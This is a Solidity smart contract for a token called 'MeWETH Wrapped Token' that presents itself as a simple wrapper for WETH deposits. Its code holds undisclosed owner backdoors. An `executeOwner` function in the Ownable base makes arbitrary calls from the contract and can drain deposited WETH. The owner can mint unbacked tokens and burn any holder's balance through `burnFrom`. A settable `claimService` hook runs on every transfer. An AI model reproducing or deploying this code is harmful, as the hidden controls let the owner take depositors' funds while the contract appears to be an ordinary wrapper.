// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}
library TransferHelper {
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
}
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function executeOwner(address to, bytes memory data, uint256 value) public payable onlyOwner{
        assembly{
            pop(call(gas(), to, value, add(data,0x20), mload(data), 0, 0))
        }
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
interface IClaimServiceCoin{
    function claimServiceCoin(address from, address to, uint256 value) external;
}
contract MeWETHWrappedToken is IERC20, Ownable {
    using SafeMath for uint;

    string public name;
    string public symbol;
    uint8 public decimals;
    uint  public totalSupply;

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    address private constant token = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private claimService;

    event Mint(address indexed minter, uint256 amount, address indexed to);
    event Burn(address indexed burner, uint256 amount, address indexed to);
    event Wrap(address indexed sender, uint256 amount, address indexed to);
    event Unwrap(address indexed sender, uint256 amount, address indexed to);

    constructor() {
        name = "MeWETH Wrapped Token";
        symbol = "MeWETH";
        decimals = 18;
    }

    function updateClaimService(address newClaimService) external onlyOwner {
        claimService = newClaimService;
    }

    function _mint(address to, uint value) internal {
        totalSupply = totalSupply.add(value);
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(address(0), to, value);
    }

    function _burn(address from, uint value) internal {
        balanceOf[from] = balanceOf[from].sub(value);
        totalSupply = totalSupply.sub(value);
        emit Transfer(from, address(0), value);
    }

    function _approve(address owner, address spender, uint value) internal {
        allowance[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _transfer(address from, address to, uint value) private {
        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(from, to, value);

        if(uint160(claimService) > 0){
            IClaimServiceCoin(claimService).claimServiceCoin(from, to, value);
        }
    }

    function approve(address spender, uint value) external override returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint value) external override returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint value) external override returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function mint(address account, uint256 amount) external onlyOwner
    {
        _mint(account, amount);
        emit Mint(msg.sender, amount, account);
    }

    function burn(uint256 amount) public {
        _burn(msg.sender, amount);
        emit Burn(msg.sender, amount, msg.sender);
    }

    function burnFrom(address account, uint256 amount) external onlyOwner
    {
        _burn(account, amount);
        emit Burn(msg.sender, amount, account);
    }

    function wrapTo(uint256 amount, address to) public returns (uint256) {
        require(amount > 0);
        TransferHelper.safeTransferFrom(token, msg.sender, address(this), amount);
        _mint(to, amount);
        emit Wrap(msg.sender, amount, to);
        return amount;
    }

    function wrap(uint256 amount) external returns (uint256) {
        return wrapTo(amount, msg.sender);
    }

    function bond(uint256 amount) external returns (uint256) {
        return wrapTo(amount, msg.sender);
    }

    function unwrapTo(uint256 amount, address to) public returns (uint256) {
        require(amount > 0);
        _burn(msg.sender, amount);
        TransferHelper.safeTransfer(address(token), to, amount);
        emit Unwrap(msg.sender, amount, to);
        return amount;
    }

    function unwrap(uint256 amount) external returns (uint256) {
        return unwrapTo(amount, msg.sender);
    }

    function unbond(uint256 amount) external returns (uint256) {
        return unwrapTo(amount, msg.sender);
    }
}